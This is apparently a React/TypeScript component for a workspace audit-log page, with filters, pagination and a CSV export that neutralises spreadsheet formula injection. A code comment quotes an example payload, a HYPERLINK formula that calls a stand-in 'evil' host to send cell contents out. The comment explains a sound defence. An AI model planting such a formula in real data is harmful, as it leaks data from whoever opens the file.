/**
 * AuditLogView — workspace audit log table with filters, search,
 * pagination, and CSV export.
 *
 * Renders the most recent audit entries as a compact table. Filter
 * controls are in a collapsible section above the table.
 */

import Badge from '@nodate-flow/ui/primitives/badge';
import Button from '@nodate-flow/ui/primitives/button';
import DatePicker from '@nodate-flow/ui/primitives/date-picker';
import EmptyState from '@nodate-flow/ui/primitives/empty-state';
import Input from '@nodate-flow/ui/primitives/input';
import Select from '@nodate-flow/ui/primitives/select';
import { type ChangeEvent, type ReactElement, useState, useTransition } from 'react';
import { useTranslation } from 'react-i18next';

import { formatDate, formatEpochDateTime } from '../../lib/format';
import { useWeekStart } from '../../lib/use-week-start';
import ui from '../settings/settings-ui.module.css';
import TruncatedText from '../settings/truncated-text';
import { type AuditLogEntry, type AuditLogFilters, useAuditLogsQuery } from './api';
import styles from './audit-log-view.module.css';

const PAGE_SIZE = 50;

/** Known audit actions for the filter dropdown. */
const ACTION_OPTIONS: readonly string[] = [
  'ai_agent.create',
  'ai_agent.pause',
  'ai_agent.update_schedule',
  'ai_agent.update_triggers',
  'ai_command.resolve',
  'ai_provider.create',
  'ai_provider.delete',
  'ai_provider.update',
  'attachment.create',
  'attachment.delete',
  'auth.login',
  'auth.login_failed',
  'auth.login_oidc',
  'auth.login_totp',
  'auth.login_totp_failed',
  'auth.logout',
  'auth.recovery_code_used',
  'comment.create',
  'comment.delete',
  'comment.update',
  'description_version.restore',
  'export.create',
  'favorite.create',
  'favorite.delete',
  'import.cancel',
  'import.create',
  'intake.convert',
  'intake.create',
  'intake.triage',
  'label.create',
  'label.disable',
  'label.update',
  'lens.create',
  'lens.delete',
  'lens.publish',
  'lens.unpublish',
  'lens.update',
  'mcp_token.create',
  'mcp_token.delete',
  'notification.archive',
  'notification.read',
  'page.create',
  'page.delete',
  'page.update',
  'project.create',
  'project.delete',
  'project.update',
  'reaction.create',
  'reaction.delete',
  'signal.create',
  'task.apply_steps',
  'task.archived',
  'task.create',
  'task.delete',
  'task.reorder',
  'task.smart_create',
  'task.transition',
  'task.unarchived',
  'task.update',
  'timebox.create',
  'timebox.delete',
  'timebox.status',
  'timebox.update',
  'user.update',
  'workspace.create',
  'workspace.delete',
  'workspace.update',
];

/** Known resource types for the filter dropdown. */
const RESOURCE_TYPE_OPTIONS: readonly string[] = [
  'ai_agent',
  'ai_command',
  'ai_provider',
  'attachment',
  'comment',
  'export',
  'favorite',
  'import_job',
  'intake_item',
  'label',
  'lens',
  'mcp_token',
  'notification',
  'page',
  'project',
  'reaction',
  'session',
  'signal',
  'task',
  'task_dependency',
  'timebox',
  'user',
  'workspace',
];

function toneForAction(action: string): 'accent' | 'warning' | 'danger' | 'neutral' {
  if (action.startsWith('auth.')) return 'warning';
  if (action.includes('.delete') || action.includes('.disable') || action.includes('.archived'))
    return 'danger';
  if (action.includes('.create') || action.includes('.unarchived')) return 'accent';
  return 'neutral';
}

function formatMetadata(meta: unknown): string {
  if (!meta) return '';
  return JSON.stringify(meta);
}

/**
 * Characters a spreadsheet reads as "this cell is an expression" when
 * one of them is the first character in the cell.
 */
const FORMULA_LEADERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Stop a cell from being executed as a formula by whatever opens the
 * file.
 *
 * An audit row carries names and metadata that people chose, so a
 * display name of `=HYPERLINK("http://evil/?"&A1,"x")` sits in the log
 * until an administrator exports it and opens the result, at which
 * point it runs and can send the surrounding cells somewhere else
 * (CWE-1236).
 *
 * Quoting does not prevent this even though the escaping below already
 * quotes anything with a comma in it: the parser removes the quotes,
 * and the spreadsheet then sees a value starting with the same
 * character it always did. The apostrophe is what spreadsheets
 * themselves document, and it matches what the server's task export
 * writes.
 */
function neutraliseFormula(value: string): string {
  if (value.length === 0 || !FORMULA_LEADERS.includes(value[0] as string)) return value;
  return `'${value}`;
}

function escapeCsvField(value: string): string {
  const safe = neutraliseFormula(value);
  if (safe.includes(',') || safe.includes('"') || safe.includes('\n')) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

function buildCsv(entries: AuditLogEntry[], headers: readonly string[], locale: string): string {
  const headerLine = headers.map(escapeCsvField).join(',');
  const rows = entries.map((e) =>
    [
      formatEpochDateTime(e.occurredAt, locale) ?? '',
      e.action,
      e.actorDisplayName ?? '',
      e.resourceType,
      e.resourcePublicId ?? '',
      e.ipAddress ?? '',
      formatMetadata(e.metadataJson),
    ]
      .map(escapeCsvField)
      .join(','),
  );
  return `${headerLine}\n${rows.join('\n')}`;
}

function handleExportCsv(
  entries: AuditLogEntry[],
  headers: readonly string[],
  locale: string,
): void {
  const csv = buildCsv(entries, headers, locale);
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `audit-log-${new Date().toISOString().slice(0, 10)}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

function AuditRow({ entry, locale }: { entry: AuditLogEntry; locale: string }): ReactElement {
  const { t } = useTranslation('settings');
  const metadata = formatMetadata(entry.metadataJson);
  return (
    <tr>
      <td className={`${ui.numeric} ${ui.muted}`}>
        {formatEpochDateTime(entry.occurredAt, locale)}
      </td>
      <td>
        <Badge tone={toneForAction(entry.action)}>{entry.action}</Badge>
      </td>
      <td>{entry.actorDisplayName ?? t('audit_log.unknown_actor')}</td>
      <td>{entry.resourceType}</td>
      <td className={`${ui.mono} ${ui.muted}`}>{entry.resourcePublicId ?? '\u2014'}</td>
      <td>
        {metadata ? (
          <TruncatedText
            text={metadata}
            className={`${styles.metadataCell} ${ui.mono} ${ui.muted}`}
          />
        ) : (
          <span className={ui.muted}>{'\u2014'}</span>
        )}
      </td>
    </tr>
  );
}

export default function AuditLogView({ workspaceId }: { workspaceId: string }): ReactElement {
  const { t } = useTranslation('settings');
  const weekStart = useWeekStart();
  const { t: tCommon, i18n } = useTranslation('common');
  const locale = i18n.resolvedLanguage ?? 'en';
  const weekdayLabels = tCommon('common.date.weekdays', { returnObjects: true }) as string[];
  const formatMonthYear = (year: number, month: number): string =>
    tCommon('common.date.monthYear', { year, month });

  const [filters, setFiltersNow] = useState<AuditLogFilters>({
    limit: PAGE_SIZE,
    offset: 0,
  });
  // The search box answers each keystroke at once; the query follows in a transition.
  const [actorInput, setActorInput] = useState('');
  // A filter or page change keeps the current rows on screen while the next
  // page suspends, instead of replacing the whole view with the fallback.
  const [isRefreshing, startTransition] = useTransition();
  const setFilters = (update: (prev: AuditLogFilters) => AuditLogFilters): void => {
    startTransition(() => {
      setFiltersNow(update);
    });
  };

  const { data } = useAuditLogsQuery(workspaceId, filters);

  const hasActiveFilter =
    Boolean(filters.action) ||
    Boolean(filters.resourceType) ||
    Boolean(filters.actorSearch) ||
    Boolean(filters.dateFrom) ||
    Boolean(filters.dateTo);

  const currentPage = Math.floor((filters.offset ?? 0) / PAGE_SIZE);
  const totalPages = Math.max(1, Math.ceil(data.total / PAGE_SIZE));

  const buildNext = (
    prev: AuditLogFilters,
    overrides: {
      action?: string;
      resourceType?: string;
      actorSearch?: string;
      dateFrom?: string;
      dateTo?: string;
    },
  ): AuditLogFilters => {
    // An empty override clears that filter; omitting it keeps the previous value.
    const next: AuditLogFilters = { limit: prev.limit ?? PAGE_SIZE, offset: 0 };
    const m = { ...prev, ...overrides };
    if (m.action) next.action = m.action;
    if (m.resourceType) next.resourceType = m.resourceType;
    if (m.actorSearch) next.actorSearch = m.actorSearch;
    if (m.dateFrom) next.dateFrom = m.dateFrom;
    if (m.dateTo) next.dateTo = m.dateTo;
    return next;
  };

  const handleActionChange = (e: ChangeEvent<HTMLSelectElement>): void => {
    const v = e.target.value;
    setFilters((prev) => buildNext(prev, { action: v }));
  };

  const handleResourceTypeChange = (e: ChangeEvent<HTMLSelectElement>): void => {
    const v = e.target.value;
    setFilters((prev) => buildNext(prev, { resourceType: v }));
  };

  const handleActorSearchChange = (e: ChangeEvent<HTMLInputElement>): void => {
    const v = e.target.value;
    setActorInput(v);
    setFilters((prev) => buildNext(prev, { actorSearch: v }));
  };

  const handleDateFromChange = (v: string): void => {
    setFilters((prev) => buildNext(prev, { dateFrom: v }));
  };

  const handleDateToChange = (v: string): void => {
    setFilters((prev) => buildNext(prev, { dateTo: v }));
  };

  const handleClearFilters = (): void => {
    setActorInput('');
    setFilters(() => ({ limit: PAGE_SIZE, offset: 0 }));
  };

  const handlePrevPage = (): void => {
    setFilters((prev) => ({
      ...prev,
      offset: Math.max(0, (prev.offset ?? 0) - PAGE_SIZE),
    }));
  };

  const handleNextPage = (): void => {
    setFilters((prev) => ({
      ...prev,
      offset: (prev.offset ?? 0) + PAGE_SIZE,
    }));
  };

  const csvHeaders = [
    t('audit_log.column.timestamp'),
    t('audit_log.column.action'),
    t('audit_log.column.actor'),
    t('audit_log.column.resource_type'),
    t('audit_log.column.resource_id'),
    t('audit_log.column.ip_address'),
    t('audit_log.column.metadata'),
  ] as const;

  const handleExport = (): void => {
    handleExportCsv(data.entries, csvHeaders, locale);
  };

  return (
    <div className={ui.page}>
      <header className={ui.header}>
        <div className={ui.headerText}>
          <h1 className={ui.title}>{t('audit_log.title')}</h1>
          <p className={ui.lede}>{t('audit_log.description')}</p>
        </div>
        <Button variant="default" onClick={handleExport} disabled={data.entries.length === 0}>
          {t('audit_log.export_csv')}
        </Button>
      </header>

      <div className={styles.filters}>
        <div className={styles.filter}>
          <label htmlFor="audit-action-filter" className={styles.filterLabel}>
            {t('audit_log.filter.action')}
          </label>
          <Select
            id="audit-action-filter"
            value={filters.action ?? ''}
            onChange={handleActionChange}
            className={styles.filterWide}
          >
            <option value="">{t('audit_log.filter.all_actions')}</option>
            {ACTION_OPTIONS.map((a) => (
              <option key={a} value={a}>
                {a}
              </option>
            ))}
          </Select>
        </div>

        <div className={styles.filter}>
          <label htmlFor="audit-resource-type-filter" className={styles.filterLabel}>
            {t('audit_log.filter.resource_type')}
          </label>
          <Select
            id="audit-resource-type-filter"
            value={filters.resourceType ?? ''}
            onChange={handleResourceTypeChange}
            className={styles.filterNarrow}
          >
            <option value="">{t('audit_log.filter.all_types')}</option>
            {RESOURCE_TYPE_OPTIONS.map((rt) => (
              <option key={rt} value={rt}>
                {rt}
              </option>
            ))}
          </Select>
        </div>

        <div className={styles.filter}>
          <label htmlFor="audit-actor-search" className={styles.filterLabel}>
            {t('audit_log.filter.actor_search')}
          </label>
          <Input
            id="audit-actor-search"
            type="search"
            autoComplete="off"
            placeholder={t('audit_log.filter.actor_search_placeholder')}
            value={actorInput}
            onChange={handleActorSearchChange}
            className={styles.filterWide}
          />
        </div>

        <div className={styles.filter}>
          <span className={styles.filterLabel}>{t('audit_log.filter.date_from')}</span>
          <DatePicker
            value={filters.dateFrom ?? ''}
            onChange={handleDateFromChange}
            weekdayLabels={weekdayLabels}
            weekStart={weekStart}
            formatMonthYear={formatMonthYear}
            prevLabel={tCommon('calendar.prev')}
            nextLabel={tCommon('calendar.next')}
            triggerLabel={
              filters.dateFrom
                ? formatDate(filters.dateFrom, locale)
                : tCommon('common.date.placeholder')
            }
          />
        </div>

        <div className={styles.filter}>
          <span className={styles.filterLabel}>{t('audit_log.filter.date_to')}</span>
          <DatePicker
            value={filters.dateTo ?? ''}
            onChange={handleDateToChange}
            weekdayLabels={weekdayLabels}
            weekStart={weekStart}
            formatMonthYear={formatMonthYear}
            prevLabel={tCommon('calendar.prev')}
            nextLabel={tCommon('calendar.next')}
            triggerLabel={
              filters.dateTo
                ? formatDate(filters.dateTo, locale)
                : tCommon('common.date.placeholder')
            }
            {...(filters.dateFrom ? { minDate: filters.dateFrom } : {})}
          />
        </div>

        <Button
          variant="ghost"
          size="sm"
          onClick={handleClearFilters}
          disabled={!hasActiveFilter}
          className={styles.clear}
        >
          {t('audit_log.filter.clear')}
        </Button>
      </div>

      <div className={styles.results} aria-busy={isRefreshing}>
        {data.entries.length === 0 ? (
          <EmptyState
            titleAs="p"
            title={t(hasActiveFilter ? 'audit_log.empty_filtered' : 'audit_log.empty')}
            className={ui.empty}
          />
        ) : (
          <div className={ui.tableWrap}>
            <table className={ui.table}>
              <thead>
                <tr>
                  <th>{t('audit_log.column.timestamp')}</th>
                  <th>{t('audit_log.column.action')}</th>
                  <th>{t('audit_log.column.actor')}</th>
                  <th>{t('audit_log.column.resource_type')}</th>
                  <th>{t('audit_log.column.resource_id')}</th>
                  <th>{t('audit_log.column.metadata')}</th>
                </tr>
              </thead>
              <tbody>
                {data.entries.map((entry) => (
                  <AuditRow key={entry.publicId} entry={entry} locale={locale} />
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {data.total > PAGE_SIZE ? (
        <nav aria-label={t('audit_log.pagination.label')} className={styles.pagination}>
          <Button
            variant="ghost"
            size="sm"
            disabled={currentPage === 0 || isRefreshing}
            onClick={handlePrevPage}
          >
            {t('audit_log.pagination.prev')}
          </Button>
          <span className={styles.pageOf}>
            {t('audit_log.pagination.page_of', {
              current: currentPage + 1,
              total: totalPages,
            })}
          </span>
          <Button
            variant="ghost"
            size="sm"
            disabled={currentPage >= totalPages - 1 || isRefreshing}
            onClick={handleNextPage}
          >
            {t('audit_log.pagination.next')}
          </Button>
        </nav>
      ) : null}
    </div>
  );
}
